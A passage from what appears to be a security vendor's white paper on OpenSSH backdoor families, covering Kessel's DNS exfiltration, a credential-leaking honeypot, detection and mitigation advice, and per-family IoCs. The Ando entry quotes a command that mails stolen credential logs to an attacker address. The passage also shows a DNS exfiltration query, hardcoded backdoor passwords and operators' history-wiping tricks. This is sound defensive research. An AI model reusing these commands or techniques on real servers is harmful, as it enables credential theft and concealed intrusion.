DNS exfiltration\n\n(see Common features of OpenSSH backdoors section)\n\nKessel encodes the data to be exfiltrated in hexadecimal and splits it into chunks that fit in subdomains\nof one, or many, DNS queries. DNS allows a maximum of 63 bytes per hostname or subdomain. Multiple\nqueries are sent when the data to be exfiltrated will not fit into three subdomains below the C&C domain name.\n\nAfter encryption and encoding, the query is sent to the attacker’s custom DNS server, where its contents\nare interpreted and decoded. This technique is commonly used to bypass firewalls and other security\ncontrols. The following figure summarizes Kessel’s DNS exfiltration process.\n\nCompromised machine\n\n\nRecursive DNS\nserver\n\n\nAuthoritative DNS Malware operator\nserver for dc0.cc\n\n|ls)|4|\n|---|---|\n\n\nHexadecimal\nencoded data\n\n```\n      466f7253534865[...]66f7.dc0.cc\n\n```\nFigure 6 // DNS exfiltration schema\n\n\nIn addition to the network exfiltration, the credentials are also logged in a local file.\n\n#### 4.4 Kamino\n\nThe history of this backdoor is interesting. We encountered the first variant of it in early 2013. Our colleague\n[Sébastien Duquette documented his findings in an article on our blog WeLiveSecurity. At the time, Kamino](https://www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/)\nwas used together with an Apache module called DarkLeech to redirect internet traffic. It was operated\nby a group mass-spreading malware through exploit kits. Fast-forwarding a few years, the same backdoor\nis being used in targeted attacks against Russian banks by a group commonly known as Carbanak\n(aka Anunak).\n\nThere are a few hypotheses that would explain this usage in two quite different contexts. It is possible\nthe same group of malicious actors changed their activities from mass-spreading malware to targeted\nattacks. Since the motivation for both attacks is financial gain, this is perfectly feasible. Also, given\nthat DarkLeech disappeared not long before Carbanak was discovered in 2014, it is not unreasonable\nto think that both attacks could be from the same group. Another explanation would be that both groups\nhired the same person to deal with Linux servers. Lastly, it’s also possible this backdoor is being sold\non the underground market and both groups are customers of the backdoor’s author. Given that DarkLeech\nwas also sold on underground forums, it’s possible both these examples of malware simply happened\nto be used by different groups.\n\n\n-----\n\n### 5. CUSTOM HONEYPOT\n\n#### 5.1 Goals\n\nIn order to build on our initial findings and extend this research, we set up a custom honeypot.\nThe main goals were:\n\n- To see if the operators behind these backdoors are still active\n\n- To get up-to-date versions of their backdoors\n\n- To see what use they made of a compromised server\n\n#### 5.2 Honeypot structure and strategy\n\n##### Low- and high-interaction honeypots\n\nWhen one speaks about honeypots, it is important to distinguish between low-interaction\nand high-interaction honeypots. As a reminder, low-interaction honeypots use emulation to expose\nvulnerable services to the internet, while limiting the ability of an attacker or malware to interact with\nthem. On the other hand, high-interaction honeypots are based on a real operating system and provide\nan actual vulnerable application or service. As the attacker gets full access to the operating system, this type\nof honeypot gives a much fuller picture of the attacker’s behavior and procedures, while being less suspicious\nthan low-interaction honeypots, which can be easily detected. The main drawbacks of using a high-inter­\naction honeypot are the risk that an attacker might pivot from your honeypot to target other machines\n(sending spam, for example, or worse), and the complexity of their setup. In our case, a high-interaction\nhoneypot was more suited to our needs as we wanted the malware’s operators, if any, to install newer\nversions of their backdoors successfully.\n\nMany medium/high-interaction OpenSSH honeypot solutions are publicly available. Amongst the most\npopular are Kippo and Cowrie (mainly based on Kippo), but since they are quite well-known, they are also\nquite easy to detect. In order to have a honeypot that arouses as little suspicion as possible, we prefer\nto use a man-in-the-middle server rather than a real OpenSSH server, so as to leave as few hints\nas possible to the attackers that they are in a honeypot.\n\nBackdoored\nOpenSSH client Leak credentials\n\nHoneypot Firewall Malware operator\n\nMitM SSH server\n\nSimulated\nMitM SSH client\nconnection\n\nUnencrypted\n\ntcpdump data exposed\n\nIptables rules\n\nHoneypot server\n\nUnmodified SSH server\n\nOther services\n\nFigure 7 // Honepot infrastructure\n\n\n-----\n\nIn this graphic, the honeypot is the SSH server and the client is the potential attacker: in this way\nwe can capture decrypted SSH sessions in full.\n\n##### Credential-leak strategy\n\nThe plan was to leak the credentials of our honeypot in order that the operator behind one of these\nbackdoors would log in and start playing. Since we did not have an already-compromised machine, we\nneeded a way to send the malware operator the credentials. Amongst the different backdoors we found,\nonly a few of them exfiltrate the credentials over the network. Moreover, the strategy is quite different\naccording to whether it is a client or daemon backdoor. Indeed, for a client backdoor, we would need only\nto use it on any host to log into the honeypot SSH server, and the credentials would be leaked to the attacker.\nWhereas this strategy is pretty easy to implement, and not likely to arouse suspicion, it is much more\ncomplicated to leak the credentials for a server backdoor while staying undercover. One of the solutions\nthat we were able to exploit was to install the daemon backdoor on the honeypot, log in using a legitimate\nSSH client so the daemon leaked the credentials and remove the backdoor after that, so that the malware\noperator thinks their backdoor has been found and has to be reinstalled. This strategy had less chance\nof succeeding because an attacker could easily see through it if a list of infected servers is kept.\n\nTo sum up, here are the strategies we followed to leak the credentials of the honeypot server, depending\non the version of the backdoor:\n\n1. Create a user on the honeypot server and give them root (sudo) rights\n\n2. Perform legitimate activity (installing HTTP server, LAMP stack…​) as this user\n\n3. Use the client backdoor (if it is available) or a legitimate client (if daemon-only) to log in as this user\n\non the honeypot server\n\n4. Daemon-only: simulate the detection of the backdoor (check for unusual activity) and remove\n\nthe backdoor from the honeypot\n\n5. Wait for the attacker to connect with the leaked credentials and observe their actions from\n\nthe man-in-the-middle server\n\n#### 5.3 Interactions observed\n\nAt the time of writing this paper, we have leaked credentials to three different backdoors and observed\nactivity from the operators of two of them. This section describes what we have witnessed.\n\n##### Mimban\n\nThis was the first backdoor for which we leaked credentials because we had reason to believe the operators\nwere still active and we had both the daemon and the client version. As described in the previous section,\nwe naturally used the client backdoor to leak the credentials.\n\n\n-----\n\nInterestingly, the attackers behind the backdoor logged in to our honeypot only a few hours after we leaked\nthe credentials, implying the operators were still monitoring this activity closely. Thanks to our honeypot\narchitecture, we were able to capture the commands executed on the server (listed in the following figure).\n\nFigure 8 // Attackers command captured in the honeypot for Minban component\n\nUnfortunately, the attackers did not make a lot of effort to give us something interesting. However,\nwe noticed that the operators:\n\n- Logged in manually (from a Russian IP address) and did not use any scripts\n\n- Cleaned the shell’s command history at each connection by unsetting the HISTFILE environment\n\nvariable\n\n- Did some basic checks (list of files, list of running processes, users currently logged in,\n\ncommand history), probably to determine if this was a honeypot\n\n- Finally, checked the version of the OpenSSH binary installed on the server.\n\n##### Borleias\n\nThe leak for this backdoor was much more productive. As was the case with the Mimban backdoor,\nthe operators took less than 24 hours to log into our honeypot with the leaked credentials. In this case,\nthe attackers logged into the honeypot more than 10 times within four days: here is an overview\nof the actions seen on the server:\n\n- They used Tor each time they logged in so we could not trace their origin\n\n- They used either a classic OpenSSH client or the Netbox Far Manager plugin to browse the server\n\nfilesystem\n\n- Interestingly, they managed to get the credentials we leaked to the Mimban backdoor operators.\n\nThis means the operators behind Mimban had probably sold the credentials or are somehow\nconnected to the Borleias attackers\n\n- They logged in the first time to do some basic checks and exfiltrate the OpenSSH client and daemon\n\nas well as the cron binary, then they came back a few days later to drop a new version\nof their backdoor\n\n- They modified the timestamps of the trojanized binaries so they were the same as the other OpenSSH files\n\n- They dropped and executed a bash script in order to get plenty of information about the server\n\n\n-----\n\n- They cleaned the command history at each connection by redefining the HISTFILE environment\n\nvariable to /dev/null\n\n- They were very careful regarding the detection of their activity (they checked running processes\n\nand the logged-in users between the execution of each command).\n\nThe new backdoor they dropped showed some similarities with the old version (especially in terms\nof C&C communications). However, a lot of new features have been implemented, so we documented\nit as a new backdoor (see Crait analysis). In order to see if there were similar backdoors in-the-wild,\nwe wrote a YARA rule based on the characteristics we extracted from this new backdoor and returned\nto the chase. Surprisingly, we quickly found a new backdoor showing similarities with Crait but also\nimplementing a whole new feature, consisting of sending commands through SSH passwords\nto the infected machine (documented as Chandrila backdoor).\n\n#### 5.4 Discussion and possible improvements\n\nFrom the results obtained from the custom honeypot we used, we believe that a lot of information can be\nretrieved regarding the activity of these malware operators, how they behave, and the likelihood of getting\nnew samples. In practice, we observed a lot of activity when we leaked credentials for client backdoors,\nbut none when we applied our strategy for daemon backdoors. This result shows that either our method\nwas not appropriate or the operators were no longer actively monitoring their C&Cs. We believe cases\nwhere the OpenSSH daemon is backdoored but the client is left untouched to be quite rare. A possible\nimprovement could have been to re-implement the credentials exfiltration mechanism in order to simulate\na connection with the client backdoor on our honeypot server. However, this assumes that the data exfil­\ntration procedure is the same for the daemon and the client, and it also can require a considerable amount\nof time to re-implement the exfiltration functions, depending on the complexity of the backdoor. For these\nreasons, we did not try this method, but it might be the subject of future work.\n\n### 6. SUMMARY TABLE\n\nBrief analyses of all 21 families of SSH backdoors this research has identified to date are included\nin the Analysis of OpenSSH backdoors section at the end of this white paper. This table provides an overview\nsummarized from that section.\n\n\n_Table 2._ _OpenSSH backdoor family feature grid_\n\n\nNetwork\nFamily\nexfiltration\n\n\nLocal\nexfiltration\n\n\nBackdoor\n\nmode\n\n\nSource Code Obfuscations\n\nDocumented Anti-logging\navailable used\n\n\nAbafar - \nAlderaan - - - \nAnoat - - - String-stacking\n\nAkiva - - - \nAndo SMTP - \n\nAtollon \nBatuu \n\n                -                 encrypted\n\n\n         -          -          -          encoded\n\n\nEncrypted\nstrings and\nstring-stacking\n\n\nBespin - - - - \nBonadan UDP - - - \nBorleias UDP - - - - \n\n-----\n\nNetwork\nFamily\nexfiltration\n\n\nLocal\nexfiltration\n\n\nBackdoor\n\nmode\n\n\nSource Code Obfuscations\n\nDocumented Anti-logging\navailable used\n\n\nEncrypted\nChandrila UDP - - \nstrings\n\nEncrypted\nCrait UDP - \nstrings\n\nCoruscant HTTP - - \nUPX (Some\nEndor SMTP variants only)\n\n\nEncrypted\nJakku HTTP - - \nstrings\n\nEncrypted\nKamino HTTP - \nstrings\n\nHTTP, TCP, Encrypted\nKessel - - \nDNS encrypted strings\n\nEncrypted\nMimban TCP - - \nstrings\n\nOnderon - - \n\nPolis Massa SMTP\n\n\n                       -                        encoded\n\n\nQuarren - - - \n### 7. MITIGATION\n\n#### 7.1 Preventing compromise of SSH servers\n\nThe raw data we had for this research was mostly malware samples only, missing contextual information.\nThus, it is difficult to determine the infection vector used to install these OpenSSH backdoors into systems.\nOne thing we know is that all the backdoors we analyzed contained credential-stealing functionality.\nThis suggests that they could spread using the stolen credentials where the compromised system is used\nto connect to another. This doesn’t explain the initial compromise but could explain how they extend their\nreach. We can also speculate that some attackers could be using brute-force attacks to gain access through\nSSH password authentication.\n\nHaving long and complex passwords prevents brute-force from being successful, but disabling password\nauthentication sounds like an even better solution. Using key-based authentication makes it more secure\nin that regard. Also, most Linux distributions nowadays disable remote root login (PermitRootLogin no),\nwhich prevents login without going through a named user account. We believe this is a good practice. Perhaps\nthe user has administrative privileges but that cannot be automatically ascertained from the username.\nFurthermore, you can identify whose credentials are compromised and react accordingly, in contrast\nto a situation where the root password is shared among admins.\n\nThe most efficient solution would be to use multi-factor authentication. While OpenSSH doesn’t\nsupport built-in multi-factor authentication it can be achieved through PAM. Existing solutions include\n[the OATH Toolkit and google-authenticator-libpam.](https://www.nongnu.org/oath-toolkit/)\n\n\n-----\n\n#### 7.2 How to detect compromised SSH tools\n\n[The IoCs published with this research include YARA rules that are available on our malware-ioc](https://github.com/eset/malware-ioc)\nGitHub repository.\n\nESET products detect the malicious OpenSSH files as Linux/SSHDoor variants.\n\nVerifying the integrity of the OpenSSH binaries sounds like a good thing to do, but it’s tricky. Unfortunately,\nunlike a signed PE on Windows or a signed Mach-O on macOS, the ELF file format does not support\nembedded signatures. Detached signatures are used by major Linux distributions. APT, used on Debian-based\ndistributions, and RPM, used on CentOS and Fedora, both support keyring and signature verification while\ninstalling new files. However, they don’t provide protection against running unsigned code. Verifying files\nafter the system is compromised could be challenging.\n\nOn RPM-based distributions, rpm -V can be used to check integrity. This will verify files from the manifest\nof the installed RPM. Now there are still questions: is it signed, who signed it and can it be trusted?\n```\nrpm -qi will answer most of those questions. The only way to be sure it is signed by a trusted\n\n```\norganization is to compare the PGP key ID. rpm will not flag an untrusted package once it is installed\nwith --nosignature. Installing RPM with the same key name but a different key ID is a technique used\nin-the-wild: Ebury uses this trick to replace files without triggering a warning from rpm -V and is almost\nimpossible to spot with rpm -qi.\n\nOn a Debian-based distribution, debsums or dpkg -V can be used to compare MD5 hashes of installed\nfiles with a manifest stored on disk in /var/lib/dpkg/info/. It’s a start, but the manifest file, which\nonly contains paths and MD5 sums, can be tampered with. An important thing to know is that in the Debian\nand Ubuntu official repositories, only the metadata is PGP-signed. The .deb package itself isn’t signed.\nThe metadata contains the hash of .deb packages and that is the only thing that can be trusted.\n\nWhatever the technique used to authenticate OpenSSH’s binaries, a cautious user could also look\nat the shared libraries they load. A malicious library could change the behavior of any application that uses\nit. None of the documented backdoors described in this paper use that technique. However, Ebury did use\nthis technique by altering libkeyutils.so, which is loaded by all OpenSSH processes.\n\nAnalyzing outgoing network traffic could help flag unusual traffic. However, it may not be obvious if a lot\nof traffic goes through the server and several of these backdoor families take steps to “hide in plain sight”\nby making their credential exfiltration look much like typical traffic a server might create.\n\n### 8. CONCLUSION\n\nIn terms of telemetry, Linux malware suffers from limited visibility compared to other platforms.\nWe hope this research helps clarify the state of in-the-wild OpenSSH backdoors and raises the right questions\nwhen securing Linux systems.\n\nIt is interesting to see that attackers have a wide range of technical skills. Some of them are quite\nadvanced compared to the off-the-shelf backdoors used by others. Nevertheless, all of them seem\nto succeed in keeping a foothold in their victims’ networks. It will be interesting to see if those that are more\nevolved persist longer and are more prevalent. Even after analyzing 21 other families, Ebury remains\nat the top of the list in terms of complexity.\n\nWe have tried to gather as much detail as possible before the publication of this paper, including by luring\nattackers into our honeypots, but there are still many unanswered questions. How prevalent are any\nof these malware families? What techniques, other than credential stealing, are they using to propagate?\nWhat are the botnets used for?\n\nThe battle against OpenSSH backdoors isn’t won. Cooperation between system administrators\nand malware researchers can help unearth Linux malware on compromised systems. Feel free to reach\n[us at threatintel@eset.com if you have details about the backdoors we have described, or not described,](mailto:threatintel@eset.com)\nor if you have any questions.\n\n\n-----\n\n### 9. REFERENCES\n\n1. ESET Research, “Operation Windigo – the vivisection of a large Linux server-side credential-stealing malware\n[campaign”, ESET, 2014. https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf](https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf)\n\n2. Jajish Thomas, “Types of Honeypots - Low Interaction Honeypots and High Interaction Honeypots”,\n_[http://www.omnisecu.com/security/infrastructure-and-email-security/low-interaction-honeypots-and-high-](http://www.omnisecu.com/security/infrastructure-and-email-security/low-interaction-honeypots-and-high-interaction-honeypots.php)_\n_[interaction-honeypots.php](http://www.omnisecu.com/security/infrastructure-and-email-security/low-interaction-honeypots-and-high-interaction-honeypots.php)_\n\n3. E. Alata, V.Nicomette, M. Kaâniche, M. Dacier, M. Herrb, “Lessons learned from the deployment of a high[interaction honeypot”, EDCC'06, 2006. https://arxiv.org/ftp/arxiv/papers/0704/0704.0858.pdf](https://arxiv.org/ftp/arxiv/papers/0704/0704.0858.pdf)\n\n4. [“Honeypot and Networking Background”, Gigatux. http://books.gigatux.nl/mirror/honeypot/final/ch01.html](http://books.gigatux.nl/mirror/honeypot/final/ch01.html)\n\n5. [Phibo, “Dionaea – catches bugs”, Github, 2010-. https://github.com/DinoTools/dionaea](https://github.com/DinoTools/dionaea)\n\n6. [Several contributors, “Kippo – SSH honeypot”, Github, 2014-. https://github.com/desaster/kippo](https://github.com/desaster/kippo)\n\n7. [Several contributors, “Cowrie SSH/Telnet Honeypot”, Github, 2014-. https://github.com/micheloosterhof/cowrie](https://github.com/micheloosterhof/cowrie)\n\n8. [Kaitai Struct, “declarative binary format parsing language”, Kaitai Project, 2015-. https://kaitai.io/](https://kaitai.io/)\n\n9. [Several contributors, “The Tor project, Inc”, 2006-. https://www.torproject.org/](https://www.torproject.org/)\n\n10. Several contributors, “NetBox: SFTP/FTP/FTP(S)/SCP/WebDAV client for Far Manager 2.0/3.0 x86/x64”,\n[Github, 2011-. https://github.com/michaellukashov/Far-NetBox](https://github.com/michaellukashov/Far-NetBox)\n\n11. Virustotal team, “The pattern matching swiss knife for malware researchers”, Virustotal, 2008-.\n_[https://virustotal.github.io/yara/](https://virustotal.github.io/yara/)_\n\n12 [OpenBSD Project, OpenSSH, 2018. https://www.openssh.com/](https://www.openssh.com/)\n\n13 [Several contributors, \"openssh/openssh-portable: Portable OpenSSH\", Github, 2018. https://github.com/openssh](https://github.com/openssh)\n\n14 M A Budiman et al, \"An Implementation of RC4+ Algorithm and Zig-zag Algorithm in a Super\n[Encryption Scheme for Text Security\", 2018, J. Phys.: Conf. Ser. 978 012086. http://iopscience.iop.org/](http://iopscience.iop.org/article/10.1088/1742-6596/978/1/012086/pdf)\n_[article/10.1088/1742-6596/978/1/012086/pdf](http://iopscience.iop.org/article/10.1088/1742-6596/978/1/012086/pdf)_\n\n15 Sébastien Duquette, \"Linux/SSHDoor.A Backdoored SSH daemon that steals passwords\", WeLiveSecurity,\n[2013. https://www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/](https://www.welivesecurity.com/2013/01/24/linux-sshdoor-a-backdoored-ssh-daemon-that-steals-passwords/)\n\n16 Randhome, \"Openssh backdoor used on compromised Linux servers\", 2016.\n_[https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/](https://www.randhome.io/blog/2016/08/01/openssh-backdoor-used-on-compromised-linux-servers/)_\n\n17 Tek, \"Te-k/openssh-backdoor: Openssh backdoor found with a ssh honeypot\", Github, 2016.\n_[https://github.com/Te-k/openssh-backdoor](https://github.com/Te-k/openssh-backdoor)_\n\n18 Seppe \"Macuyiko\", \"Running A SSH Honeypot With Kippo: Let’s Catch Some Script Kiddies\", 2011.\n_[http://blog.macuyiko.com/post/2011/running-a-ssh-honeypot-with-kippo-lets-catch-some-script-kiddies.html](http://blog.macuyiko.com/post/2011/running-a-ssh-honeypot-with-kippo-lets-catch-some-script-kiddies.html)_\n\n19 Jeff Bryner, \"Analysis on a compromised Linux RedHat 8.0 Honeypot\", GIAC, 2004.\n_[https://www.giac.org/paper/gcfa/137/analysis-compromised-linux-redhat-80-honeypot/104360](https://www.giac.org/paper/gcfa/137/analysis-compromised-linux-redhat-80-honeypot/104360)_\n\n20 [Marist College, LongTail Log Analysis, 2018. http://longtail.it.marist.edu/honey/](http://longtail.it.marist.edu/honey/)\n\n21 Homputer Security, \"Analyse de logs d’un honeypot SSH\", 2017.\n_[https://homputersecurity.com/2017/11/19/analyse-de-logs-dun-honeypot-ssh/](https://homputersecurity.com/2017/11/19/analyse-de-logs-dun-honeypot-ssh/)_\n\n22 Fernando Domínguez, \"Leaving the ssh port open to the wild\", 2016.\n_[http://blog.fernandodominguez.me/what-happens-when-you-leave-you-ssh-port-open-to-the-wild/](http://blog.fernandodominguez.me/what-happens-when-you-leave-you-ssh-port-open-to-the-wild/)_\n\n23 Kaspersky Lab ICS CERT, \"Energetic Bear/Crouching Yeti: attacks on servers | SecureList\", 2018.\n_[https://securelist.com/energetic-bear-crouching-yeti/85345/](https://securelist.com/energetic-bear-crouching-yeti/85345/)_\n\n24 _[LinuxQuestions.org, \"CentOS 5 -- ssh compromised? can't yum update...\", 2011. https://www.linuxquestions.org/](http://LinuxQuestions.org)_\n_[questions/linux-security-4/centos-5-ssh-compromised-can't-yum-update-889457/](https://www.linuxquestions.org/questions/linux-security-4/centos-5-ssh-compromised-can't-yum-update-889457/)_\n\n25 Asaf Nadler, \"Introduction to DNS data exfiltration\", 2017.\n_[https://blogs.akamai.com/2017/09/introduction-to-dns-data-exfiltration.html](https://blogs.akamai.com/2017/09/introduction-to-dns-data-exfiltration.html)_\n\n26 Frédéric Vachon, \"Windigo Still not Windigone: An Ebury Update\", 2017,\n_[https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/](https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/)_\n\n\n-----\n\n### 10. ANALYSIS OF OPENSSH BACKDOORS\n\nThis section summarizes our categorization of the 21 different families of OpenSSH backdoors\nwe have identified. Each is classified according to the following characteristics:\n\n- ESET detection name\n\n- Known period of activity based on our findings\n\n- Features as they were detailed in the Common features of OpenSSH backdoors section\n\n- Exfiltration techniques\n\n- OpenSSH versions the malware is based on\n\n- Some example hashes of samples analyzed\n\nWe also note whether the source code or documentation or analysis of the backdoor is publicly available.\n\nThe naming convention chosen is based on the list of planets in the Star Wars saga and is not in any way\nlinked with the ESET detection name.\n\nEndor\n\nAlderaan\n\nAbafar\n\nAndo\n\nAtollon\n\nQuarren Borleias\nBatuu Crait Akiva\n\n**OpenSSH**\n\nBonadan\n\n**backdoor**\n**galaxy** Coruscant Onderon\n\nChandrila Kessel Bespin\n\nMimban\n\nAnoat\n\nKamino\n\nPolis Massa\n\nJakku\n\n\nPlanet circumference\nProportional to the numbers of hashes seen\n\nCode complexity\n\n\nOrbit distance\nThe further the planet the older is its activity\n\n\nNot sophisticated Somewhat sophisticated Highly sophisticated\n\nFigure 9 // OpenSSH backdoor galaxy\n\n\n-----\n\n#### 10.1 Abafar\n\n##### ESET detection name\n\nLinux/SSHDoor.AB\n\n##### Known period of activity\n\nFrom 2016 to present (Oct 2018)\n\n##### Features\n\n          - log remote host, login time, username and password\n\n          - can log denied login attempts\n\n          - attacker can log in as root\n\n          - anti-logging feature\n\n          - multi-architecture (ARM, x86, x64, MIPS)\n\n          - client and daemon versions available\n\n##### Exfiltration techniques\n\n          - log structure\n\n        - client version: “%s:%s@%s\\n” (username, password, remote_host)\n\n        - daemon version: “%s:%s from %s\\n” (remote_host, username, password)\n\n##### OpenSSH version trojanized\n\n          - OpenSSH_6.0p1\n\n##### Existing documentation or source code\n\nSource code captured in a honeypot by a researcher:\n_[https://github.com/jivoi/openssh-backdoor-kit/tree/master/openssh-5.9](https://github.com/jivoi/openssh-backdoor-kit/tree/master/openssh-5.9)_\n\nDocumented by Angel Alonso-Parrizas in 2016:\n_[https://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-ii.html](https://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-ii.html)_\n\n##### IoCs\n\n\n_Table 3_ _Abafar samples configuration_\n\n\nHash (SHA-1) `3f1ffb5ee5dd6712999ca82371bf8b755c8a873f`\n\n\nType `Daemon`\n\nArchitecture `x64`\n\nLog filename `“/etc/X11/.pr“`\n\nBackdoor password `“PRtestD“`\n\n\nHash (SHA-1) `669c5c3ccd1ec54c7abc07278f0b08022e360c47`\n\n\nType `Client`\n\nArchitecture `x64`\n\nLog filename `“/etc/X11/.pr“`\n\nBackdoor password `N/A`\n\n\n-----\n\nType `Daemon`\n\nArchitecture `x86`\n\nLog filename `“/etc/X11/.pr“`\n\nBackdoor password `“PRtestD“`\n\n\nHash (SHA-1) `fc07cb8e43a9901eb8cd779b5646d34477155cea`\n\n\nType `Client`\n\nArchitecture `x86`\n\nLog filename `“/etc/X11/.pr“`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `b3b0e5f685bce3e22943ad2fe292cb7aa64d4c50`\n\n\nType `Daemon`\n\nArchitecture `MIPS`\n\nLog filename `“/etc/X11/.pr“`\n\nBackdoor password `“PRtestD“`\n\n\nHash (SHA-1) `605505b8bf167aad873fc700b02cc5a7389d7fe7`\n\n\nType `Client`\n\nArchitecture `MIPS`\n\nLog filename `“/etc/X11/.pr“`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `d3e07951977b2da99aa402aead708c90ff1f5a69`\n\n\nType `Client`\n\nArchitecture `ARM`\n\nLog filename `“/etc/X11/.pr“`\n\nBackdoor password `N/A`\n\n\nHash (SHA-1) `51c9abcc5455c4c8d7e45fd25a2fa8657974227f`\n\n\nType `Daemon`\n\nArchitecture `ARM`\n\nLog filename `“/etc/X11/.pr“`\n\nBackdoor password `“PRtest0“`\n\n\n-----\n\n#### 10.2 Akiva\n\n##### ESET detection names\n\nLinux/SSHDoor.AI, Linux/SSHDoor.AJ\n\n##### Known period of activity\n\nFrom July 2016 to October 2017\n\n##### Features\n\n          - log remote host, username and password\n\n          - only the client version was found\n\n##### Exfiltration techniques\n\n          - log structure: “To: %s - %s:%s\\n” (remote_host, username, password)\n\n##### Existing documentation or source code\n\n[Builder with patch: https://glot.io/snippets/emdmlw1gkn. It’s unclear if this is from](https://glot.io/snippets/emdmlw1gkn)\nthe author or captured by a honeypot.\n\n##### IoCs\n\n\n_Table 6_ _Akiva samples configuration_\n\n\nHash (SHA-1) `751f21767211f5ad256dbe30fc3e1efd74485eba`\n\n\nClient `Client`\n\nVersion `OpenSSH_7.2p2`\n\nLog filename `“/usr/local/include/uconf.h”`\n\nBackdoor password `“$gt5y^Yfgd3sss”`\n\n\nHash (SHA-1) `f7d9159b6f3eeff0cfc6626d665bc781a2b012df`\n\n\nClient `Client`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/local/include/uconf.h”`\n\nBackdoor password `“&8BBy7f&f$s@sfu8H<nyfd”`\n\n#### 10.3 Alderaan\n\n##### ESET detection name\n\nLinux/SSHDoor.AE\n\n##### Known period of activity\n\nFrom 2003 to 2017\n\n##### Features\n\n          - log username and password\n\n          - attacker can log in as root\n\n          - only the daemon version was found\n\n\n-----\n\n##### Exfiltration techniques\n\n- log structure: “login in: %s:%s\\n” (username, password)\n\n##### OpenSSH versions trojanized\n\n- OpenSSH_4.7p1\n\n##### Existing documentation or source code\n\nSource code captured in a honeypot by a researcher\n_[https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch](https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch)_\n\n##### IoCs\n\n\n_Table 4_ _Alderaan samples configuration_\n\n\nHash (SHA-1) `797dc9a1b70942b920f03e525fae0682aa05d394`\n\n\nType `Daemon`\n\nArchitecture `x64`\n\nLog filename `“/etc/gshadow--”`\n\nBackdoor password `“adm1n”:”www.linuxso.com”`\n\n\nHash (SHA-1) `a74ebc167a8f087aa9bfee250f6faa51ef05a378`\n\n\nType `Daemon`\n\nArchitecture `x86`\n\nLog filename `“/etc/gshadow--”`\n\nBackdoor password `“immortall”`\n\n#### 10.4 Ando\n\n##### ESET detection names\n\nLinux/SSHDoor.AN, Linux/SSHDoor.BW, Linux/SSHDoor.BR\n\n##### Known period of activity\n\nFrom 2008 to present (Oct 2018)\n\n##### Features\n\n          - log username and password\n\n          - attacker can log in as root (password bcrypted)\n\n          - anti-logging feature\n\n          - only the daemon version was found\n\n##### Exfiltration techniques\n\n          - log structure: “%s:%s\\n” (username, password)\n\n          - only in the most recent version of the backdoor\n\n         - execute: “cat <log_filename> | mail -s ‘Update’ <email_address>”\n\n##### Existing documentation or source code\n\nParts of the code from NoCooking ezine mirrored here:\n_[https://repo palkeo com/repositories/ivanlefou/zines/nc0/nc0 0x0b txt](https://repo.palkeo.com/repositories/ivanlefou/zines/nc0/nc0-0x0b.txt)_\n\n\n-----\n\n##### IoCs\n\n\n_Table 7_ _Ando samples configuration_\n\n\nHash (SHA-1) `6d1a47ee6554323a11fc5555ba21e02104ec30fa`\n\n\nVersion `OpenSSH_3.5.1p1 (x86)`\n\nLog filename `“/tmp/log”`\n\nBackdoor password “baltamafiotu”\n\nEmail `N/A`\n\n\nHash (SHA-1) `5fa1f033e64d3ca1e0e6d4afaa3e1cd5ede3c5b7`\n\n\nVersion `OpenSSH_4.3p2 (x86)`\n\nLog filename `“/usr/lib/libsoftokn3.so.0”`\n\n\nBackdoor password\n\n```\n“$6$vzbteb/9$6.LnOlCOzetFVCFIPBx9KPqC.\n\n8Ln7leQCNw7UjnTB5ccBKijsN4/LeE9.aQV.\n\nEq4IJv/SiNaACLjaG.bMbIEw0” (bcrypted)\n\n```\n\nEmail `N/A`\n\n\nHash (SHA-1) `868573a9235d35cabe6f4d48aaa3589d289389a2`\n\n\nVersion `OpenSSH_4.3p2 (x86)`\n\nLog filename `“/usr/lib/libsoftokn3.so.0”`\n\n\nBackdoor password\n\n```\n“$6$vzbteb/9$6.LnOlCOzetFVCFIPBx9KPqC.8Ln7\n\nleQCNw7UjnTB5ccBKijsN4/LeE9.aQV.Eq4IJv/\nSiNaACLjaG.bMbIEw0” (bcrypted)\n\n```\n\nEmail `N/A`\n\n\nHash (SHA-1) `e0f41b99481a5822254d94c8b538eb51b106189e`\n\n\nVersion `OpenSSH_4.3p2 (x64)`\n\nLog filename `“/etc/ssh/.sshd_auth”`\n\nBackdoor password `“t3se#ne@info”`\n\nEmail `testrambo2@gmail[.]com`\n\n#### 10.5 Anoat\n\n##### ESET detection name\n\nLinux/SSHDoor.AF\n\n##### Known period of activity\n\nFrom 2010 to 2017\n\n##### Features\n\n          - log remote host, login time, username and password\n\n          - attacker can log in as root\n\n          - anti-logging feature\n\n          - client and daemon versions available\n\n\n-----\n\n##### Exfiltration techniques\n\n- log structure\n\n  - client version: “OUT: %s at: %s | user: %s, pass: %s\\n”\n\n(remote_host, login_time, username, password)\n\n  - daemon version: “IN: %s at: %s | user: %s, pass: %s\\n”\n\n(remote_host, login_time, username, password)\n\n- filename format:\n\n  - client version: “<filename>.out”\n\n  - daemon version: “<filename>.in”\n\n##### IoCs\n\n\n_Table 5_ _Anoat samples configuration_\n\n\nHash (SHA-1) `8a5946cce468518feb9442cd2b9d09a801abbfb4`\n\n\nType `Daemon`\n\nVersion `OpenSSH_5.3p1`\n\nLog filename `“/usr/share/polkit-1/policy.in”`\n\nBackdoor password `“openbsd-compat”`\n\n\nHash (SHA-1) `19e7fc6f552ea199ea735b234ad1eecaca168dad`\n\n\nType `Daemon`\n\nVersion `OpenSSH_4.3p2`\n\nLog filename `“/usr/share/X11/sessmgr/coredump.in”`\n\nBackdoor password `“openbsd-compat”`\n\n\nHash (SHA-1) `d33f54935b473edbfe1a49823b2a5bcf71c17d7e`\n\n\nType `Client`\n\nVersion 